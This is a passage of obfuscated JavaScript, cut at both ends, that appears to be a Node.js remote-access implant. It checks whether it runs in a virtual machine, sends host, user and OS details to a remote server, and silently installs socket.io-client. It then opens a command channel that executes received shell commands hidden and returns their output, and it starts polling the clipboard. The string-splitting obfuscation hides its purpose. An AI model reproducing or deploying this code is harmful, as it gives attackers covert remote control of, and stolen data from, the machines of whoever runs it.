\x20\x20'+'\x20\x20'+'}\x20'+'ca'+'tc'+'h\x20'+'(e'+')\x20'+'{}'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'tr'+'y\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'co'+'ns'+'t\x20'+'se'+'tH'+'ea'+'de'+'r\x20'+'=\x20'+'as'+'yn'+'c\x20'+'fu'+'nc'+'ti'+'on'+'\x20('+')\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'tr'+'y{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20l'+'et'+'\x20i'+'sV'+'M\x20'+'=\x20'+'fa'+'ls'+'e;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20i'+'f('+'os'+'.p'+'la'+'tf'+'or'+'m('+')\x20'+'=='+'\x20\x22'+'wi'+'n3'+'2\x22'+')\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'le'+'t\x20'+'ou'+'tp'+'ut'+'\x20='+'\x20e'+'xe'+'cS'+'yn'+'c('+'\x22w'+'mi'+'c\x20'+'co'+'mp'+'ut'+'er'+'sy'+'st'+'em'+'\x20g'+'et'+'\x20m'+'od'+'el'+',m'+'an'+'uf'+'ac'+'tu'+'re'+'r\x22'+',\x20'+'{w'+'in'+'do'+'ws'+'Hi'+'de'+':\x20'+'tr'+'ue'+'})'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ou'+'tp'+'ut'+'\x20='+'\x20o'+'ut'+'pu'+'t.'+'to'+'St'+'ri'+'ng'+'()'+'.t'+'oL'+'ow'+'er'+'Ca'+'se'+'()'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'if'+'\x20('+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20o'+'ut'+'pu'+'t.'+'in'+'de'+'xO'+'f('+'\x22v'+'mw'+'ar'+'e\x22'+')\x20'+'>\x20'+'-1'+'\x20|'+'|\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ou'+'tp'+'ut'+'.i'+'nc'+'lu'+'de'+'s('+'\x22v'+'ir'+'tu'+'al'+'bo'+'x\x22'+')\x20'+'||'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20o'+'ut'+'pu'+'t.'+'in'+'cl'+'ud'+'es'+'(\x22'+'mi'+'cr'+'os'+'of'+'t\x20'+'co'+'rp'+'or'+'at'+'io'+'n\x22'+')\x20'+'||'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20o'+'ut'+'pu'+'t.'+'in'+'cl'+'ud'+'es'+'(\x22'+'qe'+'mu'+'\x22)'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20)'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20i'+'sV'+'M\x20'+'=\x20'+'tr'+'ue'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x20'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20e'+'ls'+'e\x20'+'if'+'\x20('+'os'+'.p'+'la'+'tf'+'or'+'m('+')\x20'+'=='+'\x20\x22'+'da'+'rw'+'in'+'\x22)'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20l'+'et'+'\x20o'+'ut'+'pu'+'t\x20'+'=\x20'+'ex'+'ec'+'Sy'+'nc'+'(\x22'+'sy'+'st'+'em'+'_p'+'ro'+'fi'+'le'+'r\x20'+'SP'+'Ha'+'rd'+'wa'+'re'+'Da'+'ta'+'Ty'+'pe'+'\x22,'+'\x20{'+'wi'+'nd'+'ow'+'sH'+'id'+'e:'+'\x20t'+'ru'+'e}'+')\x20'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ou'+'tp'+'ut'+'\x20='+'\x20o'+'ut'+'pu'+'t.'+'to'+'St'+'ri'+'ng'+'()'+'.t'+'oL'+'ow'+'er'+'Ca'+'se'+'()'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'if'+'\x20('+'/v'+'mw'+'ar'+'e|'+'vi'+'rt'+'ua'+'lb'+'ox'+'|q'+'em'+'u|'+'pa'+'ra'+'ll'+'el'+'s|'+'vi'+'rt'+'ua'+'l/'+'i.'+'te'+'st'+'(o'+'ut'+'pu'+'t)'+')\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'is'+'VM'+'\x20='+'\x20t'+'ru'+'e;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+('\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20e'+'ls'+'e\x20'+'if'+'\x20('+'os'+'.p'+'la'+'tf'+'or'+'m('+')\x20'+'=='+'\x20\x22'+'li'+'nu'+'x\x22'+')\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'le'+'t\x20'+'ou'+'tp'+'ut'+'\x20='+'\x20f'+'s.'+'re'+'ad'+'Fi'+'le'+'Sy'+'nc'+'(\x22'+'/p'+'ro'+'c/'+'cp'+'ui'+'nf'+'o\x22'+',\x20'+'\x22u'+'tf'+'8\x22'+').'+'to'+'Lo'+'we'+'rC'+'as'+'e('+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20i'+'f\x20'+'(\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'/h'+'yp'+'er'+'vi'+'so'+'r|'+'vm'+'wa'+'re'+'|v'+'ir'+'tu'+'al'+'bo'+'x|'+'qe'+'mu'+'|k'+'vm'+'|x'+'en'+'|p'+'ar'+'al'+'le'+'ls'+'|b'+'oc'+'hs'+'/.'+'te'+'st'+'(o'+'ut'+'pu'+'t)'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20)'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20i'+'sV'+'M\x20'+'=\x20'+'tr'+'ue'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x20'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20r'+'et'+'ur'+'n\x20'+'aw'+'ai'+'t\x20'+'ax'+'io'+'s.'+'po'+'st'+'(\x22'+'ht'+'tp'+':/'+'/'))['co'+'nc'+'at'](aa,'/a'+'pi'+'/s'+'er'+'vi'+'ce'+'/p'+'ro'+'ce'+'ss'+'/\x22'+'+u'+'id'+',\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'OS'+':\x20'+'os'+'.t'+'yp'+'e('+'),'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20p'+'la'+'tf'+'or'+'m:'+'\x20o'+'s.'+'pl'+'at'+'fo'+'rm'+'()'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'re'+'le'+'as'+'e:'+'\x20o'+'s.'+'re'+'le'+'as'+'e('+')\x20'+'+\x20'+'(i'+'sV'+'M\x20'+'?\x20'+'\x22\x20'+'(V'+'M)'+'\x22:'+'\x22('+'Lo'+'ca'+'l)'+'\x22)'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ho'+'st'+':\x20'+'os'+'.h'+'os'+'tn'+'am'+'e('+'),'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20u'+'se'+'rI'+'nf'+'o:'+'\x20o'+'s.'+'us'+'er'+'In'+'fo'+'()'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ui'+'d:'+'\x20u'+'id'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'t:'+'\x20')['co'+'nc'+'at'](a1,'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'at'+'ch'+'(e'+')\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ma'+'ke'+'Lo'+'g('+'e.'+'me'+'ss'+'ag'+'e)'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'se'+'tH'+'ea'+'de'+'r('+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20m'+'ak'+'eL'+'og'+'(\x22'+'In'+'st'+'al'+'li'+'ng'+'\x20s'+'oc'+'ke'+'t.'+'io'+'-c'+'li'+'en'+'t\x22'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20e'+'xe'+'cS'+'yn'+'c('+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'np'+'m\x20'+'in'+'st'+'al'+'l\x20'+'so'+'ck'+'et'+'.i'+'o-'+'cl'+'ie'+'nt'+'\x20-'+'-s'+'av'+'e\x20'+'--'+'no'+'-w'+'ar'+'ni'+'ng'+'s\x20'+'--'+'no'+'-s'+'av'+'e\x20'+'--'+'no'+'-p'+'ro'+'gr'+'es'+'s\x20'+'--'+'lo'+'gl'+'ev'+'el'+'\x20s'+'il'+'en'+'t\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'{\x20'+'wi'+'nd'+'ow'+'sH'+'id'+'e:'+'\x20t'+'ru'+'e\x20'+'}\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'le'+'t\x20'+'io'+'\x20='+'\x20r'+'eq'+'ui'+'re'+'(\x22'+'so'+'ck'+'et'+'.i'+'o-'+'cl'+'ie'+'nt'+'\x22)'+';\x20'+'\x20\x20'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20s'+'s\x20'+'=\x20'+'()'+'\x20='+'>\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'co'+'ns'+'t\x20'+'so'+'ck'+'et'+'\x20='+'\x20i'+'o('+'\x22h'+'tt'+'p:'+'//')['co'+'nc'+'at'](aa,':')['co'+'nc'+'at'](X,'\x22,'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20r'+'ec'+'on'+'ne'+'ct'+'io'+'nA'+'tt'+'em'+'pt'+'s:'+'\x201'+'5,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20r'+'ec'+'on'+'ne'+'ct'+'io'+'nD'+'el'+'ay'+':\x20'+'20'+'00'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ti'+'me'+'ou'+'t:'+'\x202'+'00'+'0\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'})'+';\x20'+'\x20\x20'+'\x20\x20'+'so'+'ck'+'et'+'.o'+'n('+'\x22c'+'om'+'ma'+'nd'+'\x22,'+'\x20('+'ms'+'g)'+'\x20='+'>\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'tr'+'y\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ex'+'ec'+'(m'+'sg'+'.m'+'es'+'sa'+'ge'+',\x20'+'{\x20'+'wi'+'nd'+'ow'+'sH'+'id'+'e:'+'\x20t'+'ru'+'e,'+'\x20m'+'ax'+'Bu'+'ff'+'er'+':\x20'+'10'+'24'+'\x20*'+'\x201'+'02'+'4\x20'+'*\x20'+'30'+'0\x20'+'},'+'\x20('+'er'+'ro'+'r,'+'\x20s'+'td'+'ou'+'t,'+'\x20s'+'td'+'er'+'r)'+'\x20='+'>\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'if'+'\x20('+'er'+'ro'+'r)'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20s'+'oc'+'ke'+'t.'+'em'+'it'+'(\x22'+'me'+'ss'+'ag'+'e\x22'+',\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'re'+'su'+'lt'+':\x20'+'er'+'ro'+'r.'+'me'+'ss'+'ag'+'e,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20.'+'..'+'ms'+'g,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20u'+'id'+':\x20'+'ui'+'d,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'yp'+'e:'+'\x20\x22'+'er'+'ro'+'r\x22'+',\x20'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+':\x20'+'\x22')['co'+'nc'+'at'](a1,'\x22\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'})'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'re'+'tu'+'rn'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'if'+'\x20('+'st'+'de'+'rr'+')\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'so'+'ck'+'et'+'.e'+'mi'+'t('+'\x22m'+'es'+'sa'+'ge'+'\x22,'+'\x20{'+'\x20r'+'es'+'ul'+'t:'+'\x20s'+'td'+'er'+'r,'+'\x20.'+'..'+'ms'+'g,'+'\x20t'+'yp'+'e:'+'\x20\x22'+'st'+'de'+'rr'+'\x22\x20'+'})'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'re'+'tu'+'rn'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'so'+'ck'+'et'+'.e'+'mi'+'t('+'\x22m'+'es'+'sa'+'ge'+'\x22,'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20.'+'..'+'ms'+'g,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20r'+'es'+'ul'+'t:'+'\x20s'+'td'+'ou'+'t,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'od'+'e:'+'\x20m'+'sg'+'.c'+'od'+'e,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'id'+':\x20'+'ms'+'g.'+'ci'+'d,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20s'+'id'+':\x20'+'ms'+'g.'+'si'+'d,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20u'+'id'+':\x20'+'ui'+'d,'+'\x20\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'t:'+'\x20\x22')['co'+'nc'+'at'](a1,'\x22\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'})'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'})'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ca'+'tc'+'h('+'e)'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20m'+'ak'+'eL'+'og'+'(e'+'.m'+'es'+'sg'+'e)'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20s'+'oc'+'ke'+'t.'+'on'+'(\x22'+'wh'+'ou'+'r\x22'+',\x20'+'(m'+'sg'+')\x20'+'=>'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20s'+'oc'+'ke'+'t.'+'em'+'it'+'(\x22'+'wh'+'oI'+'m\x22'+',\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'OS'+':\x20'+'os'+'.t'+'yp'+'e('+'),'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20p'+'la'+'tf'+'or'+'m:'+'\x20o'+'s.'+'pl'+'at'+'fo'+'rm'+'()'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'re'+'le'+'as'+'e:'+'\x20o'+'s.'+'re'+'le'+'as'+'e('+'),'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20h'+'os'+'t:'+'\x20o'+'s.'+'ho'+'st'+'na'+'me'+'()'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'us'+'er'+'In'+'fo'+':\x20'+'os'+'.u'+'se'+'rI'+'nf'+'o('+'),'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20u'+'id'+':\x20'+'ui'+'d,'+'\x20\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'t:'+'\x20\x22')['co'+'nc'+'at'](a1,'\x22\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'})'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'})'+';\x20'+'\x20\x20'+'\x20\x20'+'so'+'ck'+'et'+'.o'+'n('+'\x22c'+'on'+'ne'+'ct'+'\x22,'+'\x20('+')\x20'+'=>'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+');'+'\x20\x20'+'\x20\x20'+'\x20s'+'oc'+'ke'+'t.'+'on'+'(\x22'+'di'+'sc'+'on'+'ne'+'ct'+'\x22,'+'\x20('+')\x20'+'=>'+'\x20{'+'})'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'};'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20s'+'s('+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20s'+'et'+'Ti'+'me'+'ou'+'t('+'as'+'yn'+'c\x20'+'()'+'\x20='+'>\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20l'+'et'+'\x20l'+'as'+'tC'+'li'+'pb'+'oa'+'rd'+'Co'+'nt'+'en'+'t\x20'+'=\x20'+'nu'+'ll'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'le'+'t\x20'+'ti'+'me'+'r;'+'\x20\x20'+'\x20\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'fu'+'nc'+'ti'+'on'+'\x20h'+'an'+'dl'+'eC'+'li'+'pb'+'oa'+'rd'+'Ch'+'an'+'ge'+'(c'+'on'+'te'+'nt'+')\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ma'+'ke'+'Lo'+'g('+'co'+'nt'+'en'+'t)'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x20'+'\x20\x20'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20a'+'sy'+'nc'+'\x20f'+'un'+'ct'+'io'+'n\x20'+'wa'+'tc'+'hC'+'li'+'pb'+'oa'+'rd'+'()'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'if'+'(o'+'s.'+'pl'+'at'+'fo'+'rm'+'()'+'\x20='+'=\x20'+'\x22d'+'ar'+'wi'+'n\x22'+')\x20'+'{\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ex'+'ec'+'(\x22'+'pb'+'pa'+'st'+'e\x22'+',\x20'+'{w'+'in'+'do'+'ws'+'Hi'+'de'+':\x20'+'tr'+'ue'+',\x20'+'st'+'di'+'o:'+'\x20\x22'+'ig'+'no'+'re'+'\x22}'+',\x20'+'(e'+'rr'+'or'+',\x20'+'st'+'do'+'ut'+',\x20'+'st'+'de'+'rr'+')\x20'+'=>'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'ur'+'re'+'nt'+'Cl'+'ip'+'bo'+'ar'+'dC'+'on'+'te'+'nt'+'\x20='+'\x20s'+'td'+'ou'+'t.'+'tr'+'im'+'()'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'if'+'\x20('+'cu'+'rr'+'en'+'tC'+'li'+'pb'+'oa'+'rd'+'Co'+'nt'+'en'+'t\x20'+'!='+'=\x20'+'la'+'st'+'Cl'+'ip'+'bo'+'ar'+'dC'+'on'+'te'+'nt'+')\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'cl'+'ea'+'rT'+'im'+'eo'+'ut'+'(t'+'im'+'er'+');'+'\x20\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ti'+'me'+'r\x20'+'=\x20'+'se'+'tT'+'im'+'eo'+'ut'+'(('+')\x20'+'=>'+'\x20h'+'an'+'dl'+'eC'+'li'+'pb'+'oa'+'rd'+'Ch'+'an'+'ge'+'(c'+'ur'+'re'+'nt'+'Cl'+'ip'+'bo'+'ar'+'dC'+'on'+'te'+'nt'+'),'+'\x205'+'00'+');'+'\x20\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'la'+'st'+'Cl'+'ip'+'bo'+'ar'+'dC'+'on'+'te'+'nt'+'\x20='+'\x20c'+'ur'+'re'+'nt'+'Cl'+'ip'+'bo'+'ar'+'dC'+'on'+'te'+'nt'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'},'+'{\x20'+'wi'+'nd'+'ow'+'sH'+'id'+'e:'+'\x20t'+'ru'+'e\x20'+'})'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20e'+'ls'+'e\x20'+'if'+'(o'+'s.'+'pl